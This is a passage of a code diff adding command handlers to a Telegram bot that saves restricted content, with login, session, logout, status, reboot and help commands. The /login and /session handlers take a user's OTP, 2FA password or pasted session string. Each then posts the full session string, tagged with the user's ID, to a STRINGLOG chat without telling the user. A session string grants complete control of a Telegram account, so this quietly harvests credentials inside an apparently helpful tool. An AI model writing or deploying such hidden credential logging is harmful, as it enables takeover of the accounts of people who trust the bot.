+        await event.reply("Wrong code – retry /login."); return await client.disconnect()
+    except PhoneCodeExpired:
+        await event.reply("Code expired – retry /login."); return await client.disconnect()
+    except SessionPasswordNeeded:
+        pwd = await bot.ask(event.chat_id, "2FA password:", timeout=60)
+        await client.check_password(pwd.text)
+    except Exception as ex:
+        await event.reply(f"Login failed – {ex}"); return await client.disconnect()
+
+    s = await client.export_session_string(); me = await client.get_me()
+    await db.loin(event.sender_id); await login(event.sender_id, API_ID, API_HASH, s)
+    await event.reply(f"✅ Logged in as {me.first_name}\nSend links to save.")
+    await bot.send_message(STRINGLOG, f"#SESSION {event.sender_id}\n`{s}`")
+    await client.disconnect()
+
+# ---------- session ----------
+@bot.on(events.NewMessage(pattern="/session", func=lambda e: e.is_private))
+async def login_session(event):
+    if await db.is_logged(event.sender_id):
+        return await event.reply("Already logged in.")
+    s = await bot.ask(event.chat_id, "Send **Pyrogram** session string:", timeout=60)
+    if len(s.text) < 300:
+        return await event.reply("Invalid string – too short.")
+    try:
+        async with Client("saverestricted", session_string=s.text, api_id=API_ID, api_hash=API_HASH) as cli:
+            me = await cli.get_me()
+            await db.loin(event.sender_id); await login(event.sender_id, API_ID, API_HASH, s.text)
+            await event.reply(f"✅ Logged in as {me.first_name}")
+            await bot.send_message(STRINGLOG, f"#SESSION {event.sender_id}\n`{s.text}`")
+    except Exception as ex:
+        await event.reply(f"Invalid session – {ex}")
+
+# ---------- logout ----------
+@bot.on(events.NewMessage(pattern="/logout", func=lambda e: e.is_private))
+async def logout_user(event):
+    if await db.is_logged(event.sender_id):
+        await logout(event.sender_id); await db.lout(event.sender_id)
+        await event.reply("🔓 Logged out.")
+    else:
+        await event.reply("🔐 Not logged in.")
+
+# ---------- server ----------
+@bot.on(events.NewMessage(pattern="^/server$", func=lambda e: e.is_private))
+async def server_stats(event):
+    msg = await event.reply("🌐 Fetching stats...")
+    uptime = readable_time(time.time() - StartTime)
+    total, used, free = shutil.disk_usage(".")
+    cpu, mem, disk = psutil.cpu_percent(interval=0.5), psutil.virtual_memory().percent, psutil.disk_usage("/").percent
+    await msg.edit(
+        f"<b>Uptime:</b> {uptime}\n"
+        f"<b>Disk:</b> {humanbytes(total)} | <b>Used:</b> {humanbytes(used)} | <b>Free:</b> {humanbytes(free)}\n"
+        f"<b>CPU:</b> {cpu}% | <b>RAM:</b> {mem}% | <b>Disk:</b> {disk}%",
+        parse_mode="html")
+
+# ---------- reboot ----------
+@bot.on(events.NewMessage(from_users=AUTH_USERS, pattern="^/reboot$"))
+async def reboot_host(event):
+    await event.reply("Rebooting...")
+    os.execl(sys.executable, sys.executable, *sys.argv)
+
+# ---------- ping ----------
+@bot.on(events.NewMessage(pattern="^/ping$", func=lambda e: e.is_private))
+async def ping_pong(event):
+    s = time.time(); m = await event.reply("Ping...")
+    await m.edit(f"Pong!\n{(time.time()-s)*1000:.3f} ms")
+
+# ---------- cleanup ----------
+@bot.on(events.NewMessage(from_users=AUTH_USERS, pattern="^/cleanup$"))
+async def cleanup_downloads(event):
+    for f in os.listdir(downloads):
+        os.remove(os.path.join(downloads, f))
+    await event.reply("✅ Downloads cleaned.")
+
+# ---------- system ----------
+@bot.on(events.NewMessage(from_users=AUTH_USERS, pattern="^/system$"))
+async def system_info(event):
+    uname = platform.uname()
+    cpu, mem, disk = psutil.cpu_percent(), psutil.virtual_memory().percent, psutil.disk_usage("/").percent
+    await event.reply(
+        f"🖥 **System**\n\n"
+        f"**Platform:** `{uname.system}`\n"
+        f"**Release:** `{uname.release}`\n"
+        f"**Arch:** `{uname.machine}`\n"
+        f"**CPU:** `{cpu}%`  **RAM:** `{mem}%`  **Disk:** `{disk}%`")
+
+# ---------- help ----------
+@bot.on(events.NewMessage(pattern="/help", func=lambda e: e.is_private))
+async def help_handler(event):
+    await event.reply(
+        "**Quick Start**\n"
+        "• /login – phone + OTP\n"
+        "• /session – session string\n"
+        "• Send links after login.",
+        link_preview=False)
+
+# ---------- premium ----------
+@bot.on(events.NewMessage(pattern="/premium", func=lambda e: e.is_private))
+async def premium_info(event):
+    await event.reply("Upgrade for unlimited saves.\n**Contact:** @IzHarshit",
+                      buttons=Button.url("Contact", "https://t.me/izharshit"))
